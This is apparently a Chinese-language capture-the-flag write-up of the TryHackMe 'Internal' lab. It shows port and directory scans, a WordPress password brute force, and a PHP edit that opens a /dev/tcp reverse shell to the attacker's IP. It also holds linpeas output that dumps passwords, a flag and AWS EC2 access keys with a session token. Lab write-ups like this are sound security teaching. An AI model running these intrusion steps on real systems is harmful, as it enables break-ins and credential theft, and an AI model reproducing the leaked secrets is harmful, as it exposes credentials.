# 信息收集

## 端口扫描

```shell
C:\Users\Users\Desktop
# nmap --reason -p- --min-rate 10000 10.10.202.241
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-21 01:31 中国标准时间
Nmap scan report for 10.10.202.241
Host is up, received echo-reply ttl 63 (0.25s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Nmap done: 1 IP address (1 host up) scanned in 14.42 seconds

C:\Users\Users\Desktop
# nmap -p 22,80 10.10.202.241 -sV -sC
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-21 01:32 中国标准时间
NSOCK ERROR [0.0390s] ssl_init_helper(): OpenSSL legacy provider failed to load.

Nmap scan report for 10.10.202.241
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6efaefbef65f98b9597bf78eb9c5621e (RSA)
|   256 ed64ed33e5c93058ba23040d14eb30e9 (ECDSA)
|_  256 b07f7f7b5262622a60d43d36fa89eeff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.62 seconds
```

## 目录扫描

通过目录扫描发现平平无奇的 Apache 下还存在 wordpress 以及 phpmyadmin

```shell
C:\Users\Users\Desktop\常用漏洞检测工具\信息收集\目录扫描\dirsearch-0.4.2
# python3 dirsearch.py -u http://10.10.202.241/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10929

Output File: C:\Users\Users\Desktop\常用漏洞检测工具\信息收集\目录扫描\dirsearch-0.4.2\reports\1
0.10.202.241\-_24-01-21_01-35-50.txt

Error Log: C:\Users\Users\Desktop\常用漏洞检测工具\信息收集\目录扫描\dirsearch-0.4.2\logs\errors
-24-01-21_01-35-50.log

Target: http://10.10.202.241/

[01:35:51] Starting:
[01:36:00] 403 -  278B  - /.ht_wsr.txt
[01:36:00] 403 -  278B  - /.htaccess.bak1
[01:36:00] 403 -  278B  - /.htaccess.orig
[01:36:00] 403 -  278B  - /.htaccess.sample
[01:36:00] 403 -  278B  - /.htaccess.save
[01:36:01] 403 -  278B  - /.htaccess_extra
[01:36:01] 403 -  278B  - /.htaccess_orig
[01:36:01] 403 -  278B  - /.htaccessBAK
[01:36:01] 403 -  278B  - /.htaccess_sc
[01:36:01] 403 -  278B  - /.htaccessOLD
[01:36:01] 403 -  278B  - /.htaccessOLD2
[01:36:01] 403 -  278B  - /.htm
[01:36:01] 403 -  278B  - /.html
[01:36:01] 403 -  278B  - /.htpasswd_test
[01:36:01] 403 -  278B  - /.httr-oauth
[01:36:01] 403 -  278B  - /.htpasswds
[01:36:03] 403 -  278B  - /.php
[01:36:41] 301 -  313B  - /blog  ->  http://10.10.202.241/blog/
[01:36:42] 200 -    4KB - /blog/wp-login.php
[01:36:42] 200 -   53KB - /blog/
[01:37:01] 200 -   11KB - /index.html
[01:37:03] 301 -  319B  - /javascript  ->  http://10.10.202.241/javascript/
[01:37:17] 200 -   13KB - /phpmyadmin/doc/html/index.html
[01:37:18] 301 -  319B  - /phpmyadmin  ->  http://10.10.202.241/phpmyadmin/
[01:37:20] 200 -   10KB - /phpmyadmin/
[01:37:20] 200 -   10KB - /phpmyadmin/index.php
[01:37:27] 403 -  278B  - /server-status
[01:37:27] 403 -  278B  - /server-status/
[01:37:41] 200 -    4KB - /wordpress/wp-login.php
```

# Wordpress

## 弱口令爆破

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ wpscan --url http://internal.thm/wordpress -U admin -P /usr/share/wordlists/rockyou.txt

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/wordpress/ [10.10.202.241]
[+] Started: Sat Jan 20 13:58:06 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://internal.thm/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/wordpress/wp-content/themes/twentyseventeen/
 | Last Updated: 2024-01-16T00:00:00.000Z
 | Readme: http://internal.thm/wordpress/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.5
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:08 <========================================> (137 / 137) 100.00% Time: 00:00:08

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys
Trying admin / ionela Time: 00:07:18 <                                        > (3885 / 14348277)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Jan 20 14:05:46 2024
[+] Requests Done: 4059
[+] Cached Requests: 5
[+] Data Sent: 1.898 MB
[+] Data Received: 2.642 MB
[+] Memory used: 272.566 MB
[+] Elapsed time: 00:07:40
```

后台更改 php 文件反弹 shell

```shell
system("bash -c 'sh -i &>/dev/tcp/10.8.2.147/2333 0>&1'");
C:\Users\Users\Desktop\常用漏洞检测工具\内网\内网穿透\netcat-1.11
# nc.exe -lvvp 2333
listening on [any] 2333 ...
connect to [10.8.2.147] from internal.thm [10.10.202.241] 44692
sh: 0: can't access tty; job control turned off
$ whoami
www-data

$ python3 -c 'import pty; pty.spawn("/bin/bash")'

www-data@internal:/opt$ ls
ls
containerd  wp-save.txt
www-data@internal:/opt$ cat wp-save.txt
cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

## aubreanna 用户

```shell
aubreanna@internal:~$ cat user.txt
THM{int3rna1_fl4g_1}

aubreanna@internal:~$ cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080

aubreanna@internal:~$ ifconfig
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:48ff:fe50:6414  prefixlen 64  scopeid 0x20<link>
        ether 02:42:48:50:64:14  txqueuelen 0  (Ethernet)
        RX packets 8  bytes 420 (420.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 18  bytes 1324 (1.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.202.241  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::b4:22ff:fe2f:fb19  prefixlen 64  scopeid 0x20<link>
        ether 02:b4:22:2f:fb:19  txqueuelen 1000  (Ethernet)
        RX packets 54994  bytes 3704592 (3.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 90818  bytes 19011199 (19.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 331  bytes 30794 (30.7 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 331  bytes 30794 (30.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth786492a: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::9020:17ff:fe13:f653  prefixlen 64  scopeid 0x20<link>
        ether 92:20:17:13:f6:53  txqueuelen 0  (Ethernet)
        RX packets 8  bytes 532 (532.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 33  bytes 2470 (2.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

## 薄弱点探测

```shell
aubreanna@internal:~$ ./linpeas.sh


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------|
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter         :     @hacktricks_live                        |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 4.15.0-112-generic (buildd@lcy01-amd64-027) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020
User & Groups: uid=1000(aubreanna) gid=1000(aubreanna) groups=1000(aubreanna),4(adm),24(cdrom),30(dip),46(plugdev)
Hostname: internal
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)



Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.15.0-112-generic (buildd@lcy01-amd64-027) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.4 LTS
Release:        18.04
Codename:       bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.21p2


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

╔══════════╣ Date & uptime
Sat Jan 20 20:34:21 UTC 2024
 20:34:21 up  3:04,  3 users,  load average: 0.42, 0.26, 0.11

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices
/dev/disk/by-id/dm-uuid-LVM-52w2tUsocjutoPr2I8CTg9eGK9D6FcRD1qyBSmjOrmXfByioL4bKVnan7ohqpSHM    /       ext4    defaults        0 0
/dev/disk/by-uuid/1be66c6f-6666-43a1-9900-68bbf4c30971  /boot   ext4    defaults        0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?
LESSOPEN=| /usr/bin/lesspipe %s
HISTFILESIZE=0
MAIL=/var/mail/aubreanna
USER=aubreanna
SSH_CLIENT=10.8.2.147 54797 22
SHLVL=1
HOME=/home/aubreanna
SSH_TTY=/dev/pts/3
LOGNAME=aubreanna
_=./linpeas.sh
XDG_SESSION_ID=12
TERM=xterm
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
XDG_RUNTIME_DIR=/run/user/1000
LANG=C.UTF-8
HISTSIZE=0
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
PWD=/home/aubreanna
SSH_CONNECTION=10.8.2.147 54797 10.10.202.241 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL:
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2

╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Seccomp enabled? ............... disabled
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (xen)

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present (if any):
/usr/bin/docker
/usr/bin/lxc
/usr/sbin/runc
╔══════════╣ Am I Containered?
╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No


                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
                                     ╚═══════╝
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No
grep: /etc/motd: No such file or directory
═╣ AWS EC2? ............................. Yes
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM? ............................ No
═╣ Azure APP? ........................... No

╔══════════╣ AWS EC2 Enumeration
ami-id: ami-0560bbac4ff8588aa
instance-action: none
instance-id: i-09254fa4625524027
instance-life-cycle: spot
instance-type: t2.small
region: eu-west-1

══╣ Account Info
{
  "Code" : "Success",
  "LastUpdated" : "2024-01-20T20:04:16Z",
  "AccountId" : "739930428441"
}

══╣ Network Info
Mac: 02:d2:ed:56:00:e5/
Owner ID: 739930428441
Public Hostname:
Security Groups: AllowEverything
Private IPv4s:

Subnet IPv4: 10.10.0.0/16
PrivateIPv6s:

Subnet IPv6:
Public IPv4s:



══╣ IAM Role


══╣ User Data


EC2 Security Credentials
{
  "Code" : "Success",
  "LastUpdated" : "2024-01-20T20:03:32Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA2YR2KKQMVPBWZSG4",
  "SecretAccessKey" : "81vWXrvvIe+pLZtNpUXtiyEjoljOnsc0RidVUMek",
  "Token" : "IQoJb3JpZ2luX2VjEGQaCWV1LXdlc3QtMSJIMEYCIQDtrmx6aaYJkv79CP82dRwL6SM5/5Qd/cxt4G39k7y9JAIhALHlE7egBPCNfyl2IxQpbpme12rkpQeuXmTjnPfoa9phKsYECB0QAxoMNzM5OTMwNDI4NDQxIgyUH9t2wfAE22R7C40qowTlnYcAdWid161wukn0v0j45U66H9XARdS0JRUZ8d0PMVj8CUeyX0m+QKqAeRDNGBzcED3pg2aCZoNFmLZEZe/8qzG+Jkzby+C/ElA4oyKRRPpT57efwwg2w8IVVhSBm/khVkciA4JsY37P9XUmQstnV/BeJp/vZIAweIOCNhSi2i5gW4JisQ3kHPTQMEb90QREJzz5d6CoEihq2eatLo0fivTIMNQy4rp1/MMXI5zJXXcUpSN2DlwT0obQtaKADFPw57IhUOJC7Zo4J4Kh5Bu9n1KqohSNC3IadLoFCnx2ctis0WKWT2ETozODoVj1RWl4EnEM8931bdq+pjZRM1DrZpvZrZYfGt0dhggQWKLltBNbzLbY8pNlYAyW/MGDfNFtWI0dxW5l1psVs5Bx61eEfx4alEpla6lwDprt1YjAeP/lxB8b1mpx5ZQemY1n5zidFge9tQBOHRFcbJQflqryLz2auHJwmSLZY+KgnxVjoHaXULbZ19SVxZ4bEHUB1Xh/SgIFgXiKJSMBKxUD9UFxzpNPG+p/krdolJBnEEOhXyDtPP9ECMNvjrKA0PseKmMP6aXLvBXypVkNqBDhP4vGRz0KyelNRNsDdQS9kqmmtvRLOLdIsjB7wIuWOW6DNF6Qc3ZR4edguT9o9+eI8E3p33YyjZkK7w1zT+as2lWHa7V0SGcDDvazsKTapGRfcoOedr9lyJcn1FhMZvpHpho6nBUCMLPOsK0GOpIC9nkZI7wUg7N+La3/LwiLJkh4Xsi+kPeTUWaPhiCi7wAhRwR96OtYMhkOSaJW2uymlbztDdVm+t3YuZRZ4mWkfFCOcAVKPpF0y10dso8JiH8koL0kDmI3iIDCOGYcuBzElg2sc8Bdc3X6vtrKvdDuh8lESuQiRo5hf5S6uw4Za6s3tzGZ5SRHEWcHWaVCpj847IZv/o+n71RcPdLlPt1NWs0ffNkknEjSIBWDWN1d7NPEKN1g6ThkiPdDybYv/Jdr5FNBuOl44qIU0Z0/lrc3EevWqpCV3mXZQYYVIrUwUY7KuQv80osv1hDhTyH0oHeE0ZkjBhicywDzort9BCKJ0W2kXxn7ohqzxssidSM/SW30hg==",
  "Expiration" : "2024-01-21T02:23:00Z"
}
══╣ SSM Runnig
aubrean+  8512  0.0  0.0  15308  1184 pts/3    S+   20:34   0:00 sed s,ssm-agent,?[1;31m&?[0m,


                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
